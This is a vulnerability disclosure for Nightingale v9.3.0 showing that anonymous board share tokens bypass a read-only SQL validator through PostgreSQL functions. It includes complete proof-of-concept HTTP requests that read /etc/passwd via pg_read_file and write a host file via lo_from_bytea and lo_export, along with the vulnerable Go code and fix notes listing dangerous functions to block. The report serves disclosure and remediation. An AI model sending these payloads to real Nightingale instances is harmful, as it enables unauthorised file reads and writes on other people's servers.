### Vulnerability details

**Official website / Product:** https://github.com/ccfos/nightingale

**Repository:** https://github.com/ccfos/nightingale (stars at selection: 13422)

**Vulnerability type:** RCE (unexpected bypass of designed read-only control: board share token → PostgreSQL side-effect SELECT → arbitrary host file read/write)

**Vulnerability versions:** v9.3.0 (Docker `flashcatcloud/nightingale:9.3.0`; audited commit `98653573c386949985acc9abe6e5957ce6017904`)

**Vulnerability URL / Parameter:** Unauthenticated `POST /api/n9e/logs-query?__token=<board_share_token>`, JSON field `query[].sql` (requires `query[].database` or a `database.schema.table` reference in SQL); target is a board-scoped PostgreSQL datasource

**Complex:** yes

### Verification procedure

Lab topology (original tree `labs/nightingale-r29-a2/` may have been cleaned; the following facts are enough to rebuild with the same images/ports):

- Image / tag: `flashcatcloud/nightingale:9.3.0`; source commit `98653573c386949985acc9abe6e5957ce6017904`
- Host port: **20902** → container 17000
- Stack: `mysql:8.0`, `redis:6.2`, `victoriametrics/victoria-metrics:v1.79.12`, `postgres:16` (user/password/db: `n9eds` / `n9eds_pass` / `metrics`), nightingale app
- Config: `AnonymousAccess.PromQuerier=false` so the board-share token is the security boundary for the anonymous SQL path
- Default login: `root` / `root.2020`
- Board id=1 share token (PoC): `8493b628-230f-4987-ab49-ccc4972f1109`
- PostgreSQL datasource id=1 (`lab-pg`, plugin_id=7) pointed at service `postgres:5432` db `metrics`
- Expected containers after up (`docker compose ps`): `n9e-r29a2-app` (20902→17000), `n9e-r29a2-mysql` healthy, `n9e-r29a2-pg` healthy, `n9e-r29a2-redis`, `n9e-r29a2-vm`

1. Run `docker compose up -d` in the lab directory; wait until mysql/pg are healthy and the app listens on `127.0.0.1:20902`.
2. Login `root` / `root.2020`, configure the PostgreSQL datasource above (datasource id=1), create a board (board id=1), issue a time-limited share token (PoC uses `8493b628-230f-4987-ab49-ccc4972f1109`).
3. Call `POST /api/n9e/logs-query` with only `__token` (no login cookie).
4. Control: `DROP TABLE IF EXISTS public.t` is rejected by `ValidateReadOnly` with `operation DROP is forbidden in read-only mode` (see control packets below).
5. Exploit: `SELECT pg_read_file('/etc/passwd',0,200)` passes the read-only check and returns file contents; then two-step `lo_from_bytea` + `lo_export` writes `/var/lib/postgresql/n9e-r29a2-evidence.txt` on the PG host.

### Complete vulnerability PoC

#### 1) Arbitrary file read (`pg_read_file`)

Complete HTTP request (Docker-verified):

```http
POST /api/n9e/logs-query?__token=8493b628-230f-4987-ab49-ccc4972f1109 HTTP/1.1
Host: 127.0.0.1:20902
User-Agent: r29-a2-poc
Accept: application/json
Content-Type: application/json
Content-Length: 121
Connection: close

{"cate":"pgsql","datasource_id":1,"query":[{"database":"metrics","sql":"SELECT pg_read_file('/etc/passwd',0,200) AS c"}]}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
X-Trace-Id: 3815cfc3-ba92-487b-b623-1f173370498e
Date: Sun, 01 Nov 2026 23:17:34 GMT
Content-Length: 303
Connection: close

{"dat":{"total":0,"list":[{"c":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:6"}]},"err":"","request_id":"3815cfc3-ba92-487b-b623-1f173370498e"}
```

#### 2) File-write chain (same share token, two requests)

Step A — `lo_from_bytea` creates a large object, returns `oid=16394`:

```http
POST /api/n9e/logs-query?__token=8493b628-230f-4987-ab49-ccc4972f1109 HTTP/1.1
Host: 127.0.0.1:20902
User-Agent: r29-a2-poc
Accept: application/json
Content-Type: application/json
Content-Length: 154
Connection: close

{"cate":"pgsql","datasource_id":1,"query":[{"database":"metrics","sql":"SELECT lo_from_bytea(0, convert_to('R29A2-N9E-READONLY-BYPASS','UTF8')) AS oid"}]}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
X-Trace-Id: 882ff9b1-b7f5-45c5-8f63-96acaace1f60
Date: Sun, 01 Nov 2026 23:17:34 GMT
Content-Length: 103
Connection: close

{"dat":{"total":0,"list":[{"oid":16394}]},"err":"","request_id":"882ff9b1-b7f5-45c5-8f63-96acaace1f60"}
```

Step B — `lo_export` writes the host file, returns `r=1`:

```http
POST /api/n9e/logs-query?__token=8493b628-230f-4987-ab49-ccc4972f1109 HTTP/1.1
Host: 127.0.0.1:20902
User-Agent: r29-a2-poc
Accept: application/json
Content-Type: application/json
Content-Length: 150
Connection: close

{"cate":"pgsql","datasource_id":1,"query":[{"database":"metrics","sql":"SELECT lo_export(16394, '/var/lib/postgresql/n9e-r29a2-evidence.txt') AS r"}]}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
X-Trace-Id: d3d4e512-b0b6-4164-bf8f-82d7693b413f
Date: Sun, 01 Nov 2026 23:17:34 GMT
Content-Length: 97
Connection: close

{"dat":{"total":0,"list":[{"r":1}]},"err":"","request_id":"d3d4e512-b0b6-4164-bf8f-82d7693b413f"}
```

Host check:

```bash
docker exec n9e-r29a2-pg ls -la /var/lib/postgresql/n9e-r29a2-evidence.txt
docker exec n9e-r29a2-pg cat /var/lib/postgresql/n9e-r29a2-evidence.txt
```

Expected output:

```
-rw-r--r-- 1 postgres postgres 25 Nov  1 23:17 /var/lib/postgresql/n9e-r29a2-evidence.txt
R29A2-N9E-READONLY-BYPASS
```

#### 3) Control: write keyword rejected by read-only scanner

```http
POST /api/n9e/logs-query?__token=8493b628-230f-4987-ab49-ccc4972f1109 HTTP/1.1
Host: 127.0.0.1:20902
User-Agent: r29-a2-poc
Accept: application/json
Content-Type: application/json
Content-Length: 105
Connection: close

{"cate":"pgsql","datasource_id":1,"query":[{"database":"metrics","sql":"DROP TABLE IF EXISTS public.t"}]}
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
X-Trace-Id: 95fa6773-84f8-4114-ae5e-c5d0437807b1
Connection: close

{"err":"operation DROP is forbidden in read-only mode","request_id":"95fa6773-84f8-4114-ae5e-c5d0437807b1"}
```

Verification result notes:

- App log `[log_query_access] user=` (empty username) confirms the anonymous share path with `EnforceReadOnly` set. Lab excerpt:
  ```
  [log_query_access] user= client=172.30.0.1 ds_id=1 cate=pgsql query=[{"database":"metrics","sql":"SELECT pg_read_file('/etc/passwd',0,200) AS c"}]
  [log_query_access] user= client=172.30.0.1 ds_id=1 cate=pgsql query=[{"database":"metrics","sql":"SELECT lo_from_bytea(0, convert_to('R29A2-N9E-READONLY-BYPASS','UTF8')) AS oid"}]
  [log_query_access] user= client=172.30.0.1 ds_id=1 cate=pgsql query=[{"database":"metrics","sql":"SELECT lo_export(16394, '/var/lib/postgresql/n9e-r29a2-evidence.txt') AS r"}]
  ```
- Control `DROP` is rejected, proving the keyword scanner is active; `pg_read_file` / `lo_export` still pass.
- `docker exec n9e-r29a2-pg cat /var/lib/postgresql/n9e-r29a2-evidence.txt` prints `R29A2-N9E-READONLY-BYPASS`.
- Impact: anyone holding a board share link can read/write server files on the referenced PostgreSQL instance when the datasource role has `pg_read_server_files` / `pg_write_server_files` or superuser (common for admin-provisioned monitoring DS accounts).

### Vulnerability analysis

Time-limited board sharing skips login auth in `BoardTokenQueryContext` and sets `EnforceReadOnly=true` on the request context, intending to confine untrusted callers to strict read-only SQL. The SQL execution choke point `dskit/sqlbase.Query` calls `ValidateReadOnly` when that flag is set.

`ValidateReadOnly` (`dskit/sqlbase/readonly.go`) rejects executable comments and multi-statements, requires a leading keyword from the SELECT/WITH/SHOW/… allowlist, then scans for write keywords and statement shapes such as `REPLACE INTO` / `COPY … TO` / `LOAD DATA`. Comments in-tree state it is not a full SQL parser and that real defense-in-depth is a read-only DB account.

The gap: many dangerous PostgreSQL capabilities are exposed as **SELECT functions** (`pg_read_file`, `pg_ls_dir`, `lo_from_bytea`, `lo_export`, …). Those names are neither write keywords nor matches for `writeStatementRe`, so they execute fully on the “read-only” channel. This lab used the default `POSTGRES_USER` (superuser) to prove arbitrary file read and large-object export write; roles granted `pg_read_server_files` / `pg_write_server_files` can do the same.

This is an **unexpected bypass of a designed security control** (incomplete strict read-only validation for share tokens), not intentional script-notify / Agent shell.

Trigger / sink source (full path and line numbers):

```go
# File: center/router/router_board_share.go
# Lines: 149-162
func BoardTokenQueryContext(bctx *ctx.Context, dsCache *memsto.DatasourceCacheType, c *gin.Context, dsIds ...int64) bool {
	if _, ok := BoardTokenBid(c); !ok {
		return false
	}

	for _, dsId := range dsIds {
		CheckBoardTokenDsPerm(bctx, dsCache, c, dsId)
	}

	cc, _ := dskittypes.CallContextFromCtx(c.Request.Context())
	cc.EnforceReadOnly = true
	c.Request = c.Request.WithContext(dskittypes.WithCallContext(c.Request.Context(), cc))

	return true
}
```

```go
# File: dskit/sqlbase/timeseries.go
# Lines: 44-52
func Query(ctx context.Context, db *gorm.DB, query *QueryParam) ([]map[string]interface{}, error) {
	// Untrusted callers (anonymous dashboard share tokens) additionally go
	// through the strict read-only check: the blacklist below splits on
	// spaces and is not a security boundary.
	if types.ReadOnlyEnforced(ctx) {
		if err := ValidateReadOnly(query.Sql); err != nil {
			return nil, err
		}
	}
```

```go
# File: dskit/sqlbase/readonly.go
# Lines: 21-47 (allowlist and write keywords; no dangerous function names)
var readOnlyLeadingKeywords = map[string]struct{}{
	"SELECT":   {},
	"WITH":     {},
	"SHOW":     {},
	"DESC":     {},
	"DESCRIBE": {},
	"EXPLAIN":  {},
	"VALUES":   {},
	"TABLE":    {},
}

var writeKeywordRe = regexp.MustCompile(`(?i)\b(INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|TRUNCATE|RENAME|GRANT|REVOKE|ATTACH|DETACH|OPTIMIZE|EXEC|EXECUTE|UPSERT|OUTFILE|DUMPFILE|INTO|LOCK|UNLOCK|SET|USE|KILL|SHUTDOWN|RESTORE|BACKUP)\b`)

var writeStatementRe = regexp.MustCompile(`(?i)\b(REPLACE\s+INTO|LOAD\s+(DATA|XML|INFILE)|MERGE\s+INTO|COPY\s+\w+\s+(FROM|TO)\b|CALL\s+\w)`)
```

### Fix notes

1. Extend `ValidateReadOnly` to reject known side-effect functions (at least `pg_read_file`, `pg_read_binary_file`, `pg_ls_dir`, `lo_export`, `lo_import`, `lo_from_bytea`, `pg_file_write`, `pg_execute_server_program`, MySQL `LOAD_FILE`), or parse function-call graphs.
2. Require board-referenced SQL datasources to use truly read-only roles (no `pg_read_server_files` / `pg_write_server_files` / superuser) as defense-in-depth.
3. Optionally set session `default_transaction_read_only=on` on the share path and revoke EXECUTE on dangerous functions (note: `default_transaction_read_only` alone does not stop all superuser file functions).
